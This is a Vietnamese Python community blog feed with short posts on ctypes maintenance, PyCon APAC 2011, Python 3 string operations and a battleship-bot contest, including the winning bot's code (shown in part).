&lt;p&gt;Hẹn gặp các bạn vào bài tới. Chúng ta sẽ viết thử một ứng dụng FCGI đơn giản với mô-đun &lt;strong&gt;fcgi&lt;/strong&gt; của &lt;strong&gt;Allan Saddi&lt;/strong&gt;.&lt;/p&gt;
</content><category term="web"></category><category term="fcgi"></category><category term="tutorial"></category></entry><entry><title>Thomas Heller ra đi</title><link href="/2011/03/thomas-heller-ra-di.html" rel="alternate"></link><published>2011-03-21T03:28:00+07:00</published><updated>2011-03-21T03:28:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-03-21:/2011/03/thomas-heller-ra-di.html</id><summary type="html">&lt;p&gt;Ngày 19 tháng 03, Thomas Heller đã tự đề nghị nhóm phát triển Python tước quyền cập nhật của ông.&lt;/p&gt;
&lt;p&gt;Thomas Heller là tác giả gói &lt;strong&gt;ctypes&lt;/strong&gt;, được sử dụng rất nhiều trong việc kết nối Python với các thư viện ngoài.&lt;/p&gt;
&lt;p&gt;Thomas ra đi vì không còn nhiều thời …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ngày 19 tháng 03, Thomas Heller đã tự đề nghị nhóm phát triển Python tước quyền cập nhật của ông.&lt;/p&gt;
&lt;p&gt;Thomas Heller là tác giả gói &lt;strong&gt;ctypes&lt;/strong&gt;, được sử dụng rất nhiều trong việc kết nối Python với các thư viện ngoài.&lt;/p&gt;
&lt;p&gt;Thomas ra đi vì không còn nhiều thời gian để cập nhật &lt;strong&gt;ctypes&lt;/strong&gt; nữa. Và điều đó để lại một lỗ hổng to trong việc duy trì, sửa lỗi mô-đun quan trọng này.&lt;/p&gt;
</content><category term="quit"></category><category term="ctypes"></category><category term="thomas heller"></category></entry><entry><title>Hội thảo PyCon Châu Á Thái Bình Dương 2011</title><link href="/2011/02/hoi-thao-pycon-chau-a-thai-binh-duong-2011.html" rel="alternate"></link><published>2011-02-14T11:07:00+07:00</published><updated>2011-02-14T11:07:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-02-14:/2011/02/hoi-thao-pycon-chau-a-thai-binh-duong-2011.html</id><summary type="html">&lt;img alt="" src="http://pycon.sit.rp.sg/logo.png" /&gt;
&lt;p&gt;Hội thảo PyCon APAC 2011 đã mở cửa kêu gọi bài đăng ký.&lt;/p&gt;
&lt;p&gt;Để biết thêm chi tiết và gửi bài tham gia, hoặc đăng ký dự, các bạn hãy vào trang &lt;a class="reference external" href="http://apac.pycon.org/"&gt;http://apac.pycon.org/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;PCNV là một trong các nhóm hỗ trợ hội thảo.&lt;/p&gt;
</summary><content type="html">&lt;img alt="" src="http://pycon.sit.rp.sg/logo.png" /&gt;
&lt;p&gt;Hội thảo PyCon APAC 2011 đã mở cửa kêu gọi bài đăng ký.&lt;/p&gt;
&lt;p&gt;Để biết thêm chi tiết và gửi bài tham gia, hoặc đăng ký dự, các bạn hãy vào trang &lt;a class="reference external" href="http://apac.pycon.org/"&gt;http://apac.pycon.org/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;PCNV là một trong các nhóm hỗ trợ hội thảo.&lt;/p&gt;
</content><category term="2011"></category><category term="pycon"></category><category term="apac"></category></entry><entry><title>Làm việc với String (Python 3)</title><link href="/2011/02/lam-viec-voi-string-python-3.html" rel="alternate"></link><published>2011-02-09T04:46:00+07:00</published><updated>2011-02-09T04:46:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2011-02-09:/2011/02/lam-viec-voi-string-python-3.html</id><summary type="html">&lt;p&gt;So sánh cơ bản:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;caulacbopython&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pythonviet&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ghép chuỗi:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Yeu&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Python&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;YeuPython&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Split: Hiểu nôm na, ta có một cái chuỗi dài. Giờ ta sẽ cắt nó thành nhiều khúc dài dài và …&lt;/p&gt;</summary><content type="html">&lt;p&gt;So sánh cơ bản:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;caulacbopython&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;pythonviet&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;False&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ghép chuỗi:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Yeu&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Python&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;YeuPython&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Split: Hiểu nôm na, ta có một cái chuỗi dài. Giờ ta sẽ cắt nó thành nhiều khúc dài dài và sử dụng khúc nào đó thì tùy:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Cau-Lac-Bo-Python-Viet&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;
&lt;span class="go"&gt;[&amp;#39;Cau&amp;#39;, &amp;#39;Lac&amp;#39;, &amp;#39;Bo&amp;#39;, &amp;#39;Python&amp;#39;, &amp;#39;Viet&amp;#39;]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;Cau&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;Lac&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;Bo&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lấy 1 ký tự bất kì:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;chuoi&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;NguyenMinhThe&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chuoi&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;u&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chuoi&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;g&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Thay thế (Replace):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;chuoi&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MinhThe&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chuoi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;H&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MinHTHe&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Đếm số lần xuất hiện ký tự trong 1 chuỗi:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;VithonViet&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ch&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;V&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="go"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trích từ bài gửi diễn đàn của &lt;strong&gt;Nguyễn Minh Thế&lt;/strong&gt;.&lt;/p&gt;
</content><category term="string"></category></entry><entry><title>Kết quả 100 phát 100 trúng</title><link href="/2010/12/ket-qua-100-phat-100-trung.html" rel="alternate"></link><published>2010-12-21T04:38:00+07:00</published><updated>2010-12-21T04:38:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-12-21:/2010/12/ket-qua-100-phat-100-trung.html</id><summary type="html">&lt;p&gt;Để tóm gọn và đỡ tốn thời gian, giải thưởng thuộc về Nhâm Xuân Nam (cũng là người thắng giải &lt;a class="reference external" href="http://www.vithon.org/2010/06/03"&gt;http://www.vithon.org/2010/06/03&lt;/a&gt;/kết-quả-cuộc-thi-giải-toan-bằng-python).&lt;/p&gt;
&lt;p&gt;Sau đây là bài &lt;strong&gt;fire_in_the_hole.py&lt;/strong&gt; của Nhâm Xuân Nam:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="sd"&gt;Created on Dec 15, 2010&lt;/span&gt;

&lt;span class="sd"&gt;@author: namnx&lt;/span&gt;
&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;entity&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="kn"&gt;import …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Để tóm gọn và đỡ tốn thời gian, giải thưởng thuộc về Nhâm Xuân Nam (cũng là người thắng giải &lt;a class="reference external" href="http://www.vithon.org/2010/06/03"&gt;http://www.vithon.org/2010/06/03&lt;/a&gt;/kết-quả-cuộc-thi-giải-toan-bằng-python).&lt;/p&gt;
&lt;p&gt;Sau đây là bài &lt;strong&gt;fire_in_the_hole.py&lt;/strong&gt; của Nhâm Xuân Nam:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="sd"&gt;Created on Dec 15, 2010&lt;/span&gt;

&lt;span class="sd"&gt;@author: namnx&lt;/span&gt;
&lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;entity&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;inspect&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;HolePlayer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;entity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Player&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;name_ship&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;repr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_hit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="c1"&gt;# dont care&lt;/span&gt;
                &lt;span class="k"&gt;pass&lt;/span&gt;

        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;orient_ship&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;entity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HORIZONTAL&lt;/span&gt;

        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;place_ship&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ocean&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ocean&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t_ocean&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t_ocean&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;entity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Ocean&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ocean&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ocean&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;place&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t_ocean&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;ValueError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="k"&gt;pass&lt;/span&gt;

        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;lock_missile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="n"&gt;opponent_ships&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_opponent_ships&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;step&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;entity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Destroyer&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;opponent_ships&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;orientation&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;orientation&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                                                &lt;span class="k"&gt;break&lt;/span&gt;
                                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;step&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
